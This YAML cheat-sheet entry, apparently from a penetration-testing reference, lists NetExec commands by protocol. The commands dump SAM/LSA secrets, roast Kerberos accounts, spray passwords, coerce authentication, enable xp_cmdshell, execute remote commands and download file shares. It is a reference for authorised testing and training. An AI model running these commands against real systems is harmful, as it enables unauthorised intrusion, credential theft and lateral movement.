---
variants:
  - label: smb
    command: |
      nxc smb $IP -u '$USER' -p '$PASSWORD' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
      nxc smb $IP -u 'a' -p ''
      nxc smb $IP -u $USER -H $HASH --local-auth --sam --lsa
      nxc smb $IP -u $USER -k --use-kcache --shares
      nxc smb $IP -u '$USER' -p '$PASSWORD' -X 'whoami'
      nxc smb $IP -u $USER -p $PASSWORD -M coerce_plus
      nxc smb $IP -M timeroast
      nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o EXCLUDE_DIR='ADMIN$,C$,IPC$' READ_ONLY=false DOWNLOAD=true
      nxc smb smb_hosts.txt --gen-relay-list relay_targets.txt
  - label: ldap
    command: |
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --trusted-for-delegation --password-not-required --admin-count --users --groups
      nxc ldap $IP -u users.txt -p '' --asreproast hashes.asrep
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting hashes.kerberoast
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --bloodhound -c All --dns-server $DCIP
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --find-delegation
  - label: winrm
    command: |
      nxc winrm $IP -u usernames.txt -p $PASSWORD -d $DOMAIN --local-auth
      nxc winrm $IP -u $USER -H $HASH
      nxc winrm $IP -u '$USER' -p '$PASSWORD' -X 'net localgroup administrators'
  - label: mssql
    command: |
      nxc mssql $IP -u $USER -p $PASSWORD --local-auth
      nxc mssql $IP -u $USER -p $PASSWORD -M mssql_priv
      nxc mssql $IP -u $USER -p $PASSWORD -q 'SELECT @@version'
      # xp_cmdshell is off by default, turn it on before -x will work
      nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
      nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami'
  - label: rdp
    command: |
      nxc rdp $IP -u $USER -p $PASSWORD
      nxc rdp $IP -u $USER -p $PASSWORD --screenshot
      nxc rdp $IP -u '' -p '' --nla-screenshot
  - label: ssh
    command: |
      nxc ssh $IP -u users.txt -p passwords.txt --continue-on-success
      nxc ssh $IP -u $USER -p $PASSWORD -x 'id'
  - label: ftp
    command: |
      nxc ftp $IP -u users.txt -p passwords.txt
      nxc ftp $IP -u $USER -p $PASSWORD --ls
description: Enumerate or attack a host with NetExec, by protocol.
os: [Linux]
category: [oscp, cli]
have: [hash, ticket]
service: [SMB, LDAP, WinRM, MSSQL, RDP, SSH, FTP]
phase: [Enumeration, Exploitation, CredAccess, LateralMovement]
references:
  - https://github.com/Pennyw0rth/NetExec
  - https://www.netexec.wiki/
---
